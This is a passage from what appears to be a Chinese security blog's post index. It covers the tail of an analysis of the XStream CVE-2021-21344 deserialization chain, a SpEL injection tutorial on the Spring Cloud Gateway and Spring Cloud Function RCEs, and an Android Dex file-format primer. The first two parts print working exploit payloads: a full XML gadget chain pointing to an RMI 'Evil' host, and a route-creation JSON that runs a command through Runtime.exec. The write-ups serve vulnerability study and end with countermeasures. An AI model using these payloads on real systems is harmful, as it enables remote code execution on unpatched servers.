但是我们注意到奇怪的一点，这里dataSource被声明在了JdbcRowSetImpl的父类BaseRowSet中，而JdbcRowSetImpl本身并没有得到构造。 这与XML序列化的特点有关。我们构造一个Student类，使其继承自Person，并为其增加一个grade属性： 123456789101112public class Student extends Person implements Serializable { private Integer grade; public Student(Integer age, Integer grade) { super(age); this.grade = grade; } public void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { System.out.println(&quot;[+] Student's readObject.&quot;); }} 查看其序列化后的XML： 可见父类Person的属性age被声明在&lt;javasec4.Student&gt;外。以此类推，由于dataSource实际上归属于BaseRowSet，因此只需在其下声明即可。 完整的POC如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;java.util.PriorityQueue serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt; &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt; &lt;packet&gt; &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt; &lt;dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'&gt; &lt;bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'&gt; &lt;bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'&gt; &lt;bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'&gt; &lt;jaxbType&gt;com.sun.rowset.JdbcRowSetImpl&lt;/jaxbType&gt; &lt;uriProperties/&gt; &lt;inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'&gt; &lt;getter&gt; &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt; &lt;name&gt;getDatabaseMetaData&lt;/name&gt; &lt;parameter-types/&gt; &lt;/getter&gt; &lt;/inheritedAttWildcard&gt; &lt;/bi&gt; &lt;context&gt; &lt;marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'&gt; &lt;outer-class reference='../..'/&gt; &lt;/marshallerPool&gt; &lt;nameList&gt; &lt;namespaceURIs/&gt; &lt;localNames/&gt; &lt;/nameList&gt; &lt;/context&gt; &lt;/bridge&gt; &lt;/bridge&gt; &lt;jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt; &lt;javax.sql.rowset.BaseRowSet&gt; &lt;default&gt; &lt;dataSource&gt;rmi://localhost:1097/Evil&lt;/dataSource&gt; &lt;params/&gt; &lt;/default&gt; &lt;/javax.sql.rowset.BaseRowSet&gt; &lt;/jaxbObject&gt; &lt;/dataSource&gt; &lt;/message&gt; &lt;satellites/&gt; &lt;invocationProperties/&gt; &lt;/packet&gt; &lt;/indexMap&gt; &lt;/comparator&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt; &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; 共55行，相较于官网的103行，精简了许多。 总结一下，CVE-2021-21344的关键词有两个，PriorityQueue和JAX-WS (Java API For XML-WebService)。首先，XStream反序列化时，进入了PriorityQueue的反序列化方法，接着，借助JAX-WS的相关类，对XML再次进行了序列化，从而触发了JNDI注入。","link":"/2022/01/17/JavaSec%E7%B3%BB%E5%88%97-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5-2/"},{"title":"JavaSec系列 - 5. SpEL注入","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec5 先前，我们在系列2中jdk&gt;8u191的环境下实现JNDI注入时，使用到了EL表达式。SpEL，是EL的一种，”Sp”代表”Spring”，即用于Spring的表达式。而最近，Spring Cloud爆出两个RCE，其原理均为SpEL注入，因此我们下面通过接触这两个实例来了解SpEL注入的实现。 (1) SpEL基础下面是SpEL表达式解析的过程： 1234567void testSpEL() throws Exception { ExpressionParser parser = new SpelExpressionParser(); //a Expression expression = parser.parseExpression(&quot;('Hello' + ' World').concat(#end)&quot;); //b EvaluationContext context = new StandardEvaluationContext(); //c context.setVariable(&quot;end&quot;, &quot;!&quot;); //d System.out.println(expression.getValue(context)); //e} 输出为Hello World!。其中： a：通过SpelExpressionParser类构造解析器。 b：传入SpEL表达式。 c：通过StandardEvaluationContext构造上下文。 d：在上下文中，我们可以自定义变量、函数等。 e：调用getValue方法，根据上下文解析SpEL表达式。 我们重点来关注一下SpEL如何来实现类： 12345public void testClass() { ExpressionParser parser = new SpelExpressionParser(); Class&lt;String&gt; stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class); System.out.println(stringClass);} 输出如下： 可知，通过SpEL表达式T(type)，可以实现类型为type的类。非常像反射。意味着如果攻击者可以控制传入的SpEL表达式，就可能实现RCE。 (2) Spring Cloud Gateway RCE (CVE-2022-22947)Spring Cloud Gateway (以下简写为SCG)，提供了Spring上的路由功能。 默认情况下，SCG的属性management.endpoint.gateway.enabled为true，即允许远程地调用/actuator/gateway对路由进行配置。如POST到/gateway/routes/{id_route_to_create}添加路由，并再次POST到/actuator/gateway/refresh以使配置生效。 下面开始分析其是否存在SpEL注入的可能。我们先来看SCG源码，根据SpEL基础，我们全局搜索SpelExpressionParser，在ShortcutConfigurable接口中，我们找到了getValue方法： 可见，若entryValue以”#{“开头、以”}”结尾，则将其看作SpEL表达式并进行解析。因此，若entryValue可控，则可能实现SpEL注入。那接下来的任务便是寻找entryValue的来源。 向上回溯，ShortcutConfigurable接口下的三个ShortcutType枚举均调用了getValue方法： 注意entryValue的传入，即entry.getValue()，可知来自于键值对形式的args变量的值。 继续向上，normalize()方法调用自ConfigurationService类的normalizeProperties()方法，而args即该类的properties属性： normalizeProperties()调用自同类下的bind()： 其中强调了name和properties属性不能为空。 而bind()在RouteDefinitionRouteLocator类的loadGatewayFilters()中被调用： 着重分析下该方法。可见，参数filterDefinitions包含多个filter的定义，在127行中，将filter实例化为GatewayFilterFactory对象，并自138行开始configure：name属性即filter的name，properties属性即filter的args。 到这里，payload的构造已经清晰：我们要创建一个路由，其filter是实现了GatewayFilterFactory接口的对象，args包含恶意的SpEL表达式。 随意选择一个实现GatewayFilterFactory的类，如Retry： 结合官方提供的路由创建样例，构造payload： 123456789{ &quot;id&quot;: &quot;javasec&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;Retry&quot;, &quot;args&quot;: { &quot;value&quot;: &quot;#{T(java.lang.Runtime).getRuntime().exec(\\&quot;calc\\&quot;)}&quot; } }]} 此处args中SpEL表达式的key，经测试可随意更改。 路由创建成功后，返回201 Created： 刷新路由，弹出计算器，实现SpEL注入： 查看调用栈，与前文分析一致： 由于是本地测试，我们可以选择任意一个实现了GatewayFilterFactory的类作为filter。但若是远程测试需要回显，则需要选择AddResponseHeaderGatewayFilterFactory类。 (3) Spring Cloud Function RCE老样子，在Spring Cloud Function (以下简写为SCF) 框架中，全局搜索SpelExpressionParser，定位到RoutingFunction类的functionFromExpression的方法： 很明显，要利用的目标是routingExpression。向上跟： 可见，routingExpression来自于请求头中的spring.cloud.function.routing-expression参数。而想要触发SCF的function routing功能，根据官方文档，要访问的接口应为functionRouter，其在RoutingFunction类中也有定义： 构造POST请求： 发现未能弹出计算器。调试发现，在route()方法中，传入的input为FluxEmpty类，因此未能进入functionFromExpression方法： 向上追溯到FunctionController类的post()方法中，会发现input来自于请求的body： 于是加入body，再次请求，实现SpEL注入： 调用栈如下： 另外，官方文档提供了访问任意路径触发function routing的方法，即在application.properties中添加如下属性： 测试： (3) CountermeasuresSCG的漏洞修复，可以设置management.endpoint.gateway.enabled属性为false以拒绝远程调用。 更为通用的修复方法，我们可以看到两个框架中对SpEL的处理均使用的StandardEvaluationContext： StandardEvaluationContext提供了全部SpEL语法，因此，将其替换为不能实例化类的SimpleEvaluationContext会更加安全。","link":"/2022/04/01/JavaSec%E7%B3%BB%E5%88%97-5-SpEL%E6%B3%A8%E5%85%A5/"},{"title":"Android加固系列-1-Dex101","text":"工具源码： https://github.com/hey3e/DexStrFinder 根据被加固的对象，Android加固可以分为两大类：Java层加固与Native层加固。Java层加固，主要针对的是Dex文件。因此，了解Dex是理解Java层加固的基础。 首先我们回顾一下常见的apk逆向流程：解压apk得到Dex文件，使用dex2jar将Dex文件转换为Jar，再用jadx反编译Jar查看Java源码。 而正向编译流程，是先将Java源码编译成多个Class文件，再将他们合并成Jar或者Dex。 从组成结构上，Dex可以对标Jar，二者均是由多个Class文件组成。而从文件类型上，作为Dalvik虚拟机的可执行文件，Dex对标的是作为JVM可执行文件的Class。 下面我们就看一下如何将Class转换为Dex。编写Hello.java: 12345public class Hello { public static void main(String[] args) { System.out.println(&quot;Hello DEX!&quot;); }} 执行如下命令： 12javac Hello.javadx --dex --output=Hello.dex Hello.class 即可得到Hello.dex文件。 下面，我们使用010 Editor解析Dex文件并进行分析其格式。 可见，一个基本的Dex文件分为： 文件头header 索引区，包含字符串string、类型type、方法原型proto、域field和方法method的索引 类定义区class_def 整个文件的索引map dex_header首先我们来看header，它包含如下内容： 其中： magic：魔数，Dex文件的标识，其值为dex\\n035\\0。脱壳脚本便是通过搜索该值的方式寻找Dex文件。 checksum：文件校验码，使用Alder32算法校验文件剩余部分的正确性。 signature：签名，使用SHA1算法计算文件剩余部分的签名。 file_size：Dex文件大小。 header_size：Dex文件头大小。 endian_tag：大小端标签。标准Dex文件为小端： link_size和link_off：Dex文件链接部分的大小和偏移。 map_off：Dex文件map部分的偏移值。 其余为Dex文件剩余部分的大小及偏移。 dex_string_ids索引区第一部分，字符串索引，其个数为header中string_ids_size的值，起始地址为header中string_ids_off的值： 深入来看各条目，以&lt;init&gt;为例： 只有一个string_data_off，既然是索引区，其存放的即为字符串的真正地址： 由于是小端存储，我们来到176h： 确实为&lt;init&gt;。继续分析该处： 可见由两部分组成，utf16_size和data。不难理解，两个值分别代表该字符串的大小和内容。 这里的utf16_size，数据类型为uleb128，即unsigned little endian base 128，用于避免int类型恒为4字节而产生的内存浪费。其原理为：每个字节的最高位为标志位，1则下一个字节继续表示，0则结束。类似报文的分片。 dex_type_ids索引区第二部分，类型索引，其个数为header中type_ids_size的值，起始地址为header中type_ids_off的值： 分析到这里时，类比string，我们举一反三：type中的各条目，为type_data_off，存放着类型的真正地址。 深入验证一下，以Hello为例： 发现和想象中的不太一样，并没有type_data_off，取而代之的是description_idx，此处的值为0x03： 根据其描述：&quot;String ID for this type descriptor&quot;，可知与string有关，我们回头看string部分： 发现string_id[]恰恰为”LHello;”。我们再取type_id[]，java.io.PrintStream，进行验证，其description_idx为0x04： 匹配string_id[]： 可知，description_idx代表的是上一部分string_id_list的索引值。我们可以体会到这样设计的用意，类型本身也是字符串，因此直接引用已经存储好的字符串即可，无需额外浪费空间。 dex_proto_ids索引区第三部分，方法原型索引，其个数为header中proto_ids_size的值，起始地址为header中proto_ids_off的值： 深入来看： 由三部分组成。shorty_idx和return_type_idx均以idx结尾，根据前文经验和其描述，可知前者方法签名指向string的索引，后者返回值指向type的索引。 关于方法签名，在中，签名格式为(参数1类型;参数2类型...;)返回值类型，而Dex文件中更为简略，为返回值类型+参数1类型+参数2类型...。 第三个字段parameter_off，为方法参数的偏移，此处void()无参为0。我们再找一个有参数的方法： 偏移值为： 来到168h： size代表参数个数，参数类型为type_idx指向的type索引位置。 dex_field_ids索引区第四部分，域索引，其个数为header中field_ids_size的值，起始地址为header中field_ids_off的值： 深入来看： 大同小异，三个idx分别指向type、type、string的索引，分别表示域所属类的类型、域类型、域名。 dex_method_ids索引区最后一部分，方法索引，其个数为header中method_ids_size的值，起始地址为header中method_ids_off的值： 三部分，分别指向type、proto、string的索引，分别表示方法所属类的类型、方法原型、方法名。 至此，索引区的分析结束。我们可以发现，dex_string_ids是整个索引区的基石，由它延伸出一个个更为精准的索引。 dex_class_defs类定义区，其个数为header中class_def_size的值，起始地址为header中class_def_off的值： 深入来看： 其中： class_idx：类的类型，指向type的索引。 access_flags：类的访问类型，如public、private、protected等。 superclass_idx：类的父类类型，指向type的索引。 interfaces_off：类的接口偏移。 source_file_idx：类的源文件信息，指向string的索引。 annotations_off：类的注释偏移。 class_data_off：类的数据偏移。 前六个都比较好理解，而最后一个，类的数据，具体包含什么呢？我们前往偏移处看一下： 可见，四个size，分别代表了该类四种属性的个数。该类有两个direct_method，因此还包含了一个详细描述它们的encoded_method_list： 对于每一个method，包含： method_idx_offs：方法信息，指向method的索引。 access_flags：方法的访问类型。 code_off：方法代码偏移。 我们继续追踪到代码偏移处： 可知，存储了寄存器数目、参数数目等信息。 至此，整个Dex文件的格式分析完毕。 应用首尾呼应，理解Dex，是理解Java层加固的基础。除此之外，学会解析Dex，也可以衍生出其他妙用。 在收集Android app信息时，常见的分析框架如、，其采用的方式为反编译app后，逐行读取源码进行正则匹配。固然，此种方式收集的信息较全，但在面对某些小型场景，如只希望确定该app是否调用某API时，该方案便显得有些笨拙。 而理解Dex后，我们便可以采用解析app Dex文件string区的方式来快速收集该app包含的字符串，并在结果中定位目标，大大提高效率。","link":"/2022/04/20/Android%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97-1-Dex101/"}],"tags":[{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"反射","slug":"反射","link":"/tags/%E5%8F%8D%E5%B0%84/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"},{"name":"SpEL","slug":"SpEL","link":"/tags/SpEL/"},{"name":"加固","slug":"加固","link":"/tags/%E5%8A%A0%E5%9B%BA/"}],"categories":[{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"JavaSec","slug":"JavaSec","link":"/categories/JavaSec/"},{"name":"Android加固","slug":"Android加固","link":"/categories/Android%E5%8A%A0%E5%9B%BA/"}]}